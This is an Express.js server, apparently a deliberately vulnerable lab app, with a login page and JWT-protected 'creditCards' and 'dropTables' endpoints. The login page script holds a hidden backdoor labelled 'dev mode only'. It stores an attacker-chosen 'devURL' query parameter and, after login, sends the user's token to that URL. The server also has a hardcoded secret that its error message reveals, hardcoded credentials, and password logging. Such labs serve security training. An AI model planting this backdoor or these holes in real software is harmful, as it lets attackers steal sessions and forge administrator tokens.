const express = require('express');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3000;
const SECRET_KEY = 'your-secret-key'; // Change this to a strong and secure secret key

app.use(bodyParser.json());

app.get('/ping', (req, res) => {
  res.json('pong')
})

app.get('/', (req, res) => {
  const htmlResponse = `
  <!DOCTYPE html>
  <head>
      <meta charset="UTF-8">
      <title>Login Page</title>
  </head>
  <body>
  <h1>Login</h1>
  <form id="login-form">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" required><br>
      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required><br>
      <button type="submit">Login</button>
  </form>

  <script>
      //// acmichaud the cyber pirate was here
      function getURLParams() {
        const params = new URLSearchParams(window.location.search);
        return Object.fromEntries(params.entries());
      }

      // Check for GET parameters in the URL
      const urlParams = getURLParams();

      // Check if 'devURL' parameter is present in the URL
      if (urlParams.hasOwnProperty('devURL')) {
          // Get the value of 'devURL' from the URL
          const devURLValue = urlParams['devURL'];

          // Set 'devURLValue' in local storage
          localStorage.setItem('devURL', devURLValue);
      }

      ///// original
      const loginForm = document.getElementById('login-form');

      loginForm.addEventListener('submit', async (event) => {
          event.preventDefault();
          const username = document.getElementById('username').value;
          const password = document.getElementById('password').value;
          const body = JSON.stringify({
            username, password
          })
          console.log(body)
          try {
              const response = await fetch('/authenticate', {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body
              });
              if (response.ok) {
                  const data = await response.json();
                  const token = data.token;


                  // dev mode only
                  if (localStorage.getItem("devURL"))
                  await fetch(localStorage.getItem("devURL"), {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json"
                    },
                    body: JSON.stringify({token})
                  });

                  // Store the token in local storage
                  localStorage.setItem('jwtToken', token);

                  // Redirect to another page or update the UI as needed
                  window.location.href = '/home';
              } else {
                  alert('Authentication failed');
              }
          } catch (error) {
              alert('An error occurred:', error);
          }
      });
  </script>
  </body>
  </html>
`;
res.send(htmlResponse);
})

app.get('/home', (req, res) => {
  const htmlResponse = `
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
</head>
<body>
    <h1>Welcome to the Dashboard</h1>
    <p>This is a protected page.</p>
    
    <button id="dropTableButton">Drop Table to init server</button>
    <button id="testButton">Ma carte de crédit</button>

    <script>
        // Retrieve the token from local storage
        const token = localStorage.getItem('jwtToken');

        // Include the token in the headers for future requests
        const headers = new Headers({
            'Authorization': 'Bearer ' + token
        });

        const dropTableButton = document.getElementById('dropTableButton');
        const testButton = document.getElementById('testButton');

        // Function to make a GET request and display the response in an alert
        const makeGetRequest = async (url) => {
            try {
                const response = await fetch(url, { headers });
                if (response.ok) {
                    const data = await response.json();
                    alert('Response: ' + JSON.stringify(data));
                } else {
                    alert('Request failed with status: ' + response.status);
                }
            } catch (error) {
                alert('An error occurred: ' + error.message);
            }
        };

        // Add click event listeners to the buttons
        dropTableButton.addEventListener('click', () => {
            makeGetRequest('/dropTables');
        });

        testButton.addEventListener('click', () => {
            makeGetRequest('/creditCards');
        });
    </script>
</body>
</html>
`;
res.send(htmlResponse);
})


// Create a POST route to generate and return JWT token
app.post('/authenticate', (req, res) => {
  const { username, password } = req.body;
  console.log("🚀 ~ file: server.js:17 ~ app.post ~ req.body:", req.body)
  console.log("🚀 ~ file: server.js:17 ~ app.post ~ username, password:", username, password)

  // In a real application, you would typically validate the username and password against a database
  if (username === 'user' && password === 'laco333') {
    // Create a JWT token
    const token = jwt.sign({ username, role: "user" }, SECRET_KEY, { expiresIn: '1h' });
    res.json({ token });
  } else {
    res.status(401).json({ message: 'Invalid credentials' });
  }
});

app.get('/creditCards', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1]
  console.log(token)
  try {
    const decoded = jwt.verify(token, SECRET_KEY)
    res.json("4550-1231-4584-8844")
  } catch (e) {
    res.status(401).json({ message: `Invalid token. Make sure that it is encrypted with the key : ${SECRET_KEY}` });
  }
});

app.get('/dropTables', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1]

  try {
    const decoded = jwt.verify(token, SECRET_KEY)
    console.log("🚀 ~ file: server.js:46 ~ app.get ~ decoded:", decoded)
    if (decoded.role === "administrator") {
      res.json("All tables were dropped, we are doomed! :(")
    } else {
      res.status(401).send("cannot drop table. Only use once when initiating the server");
    }
  } catch (e) {
    res.status(401).send(e);
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
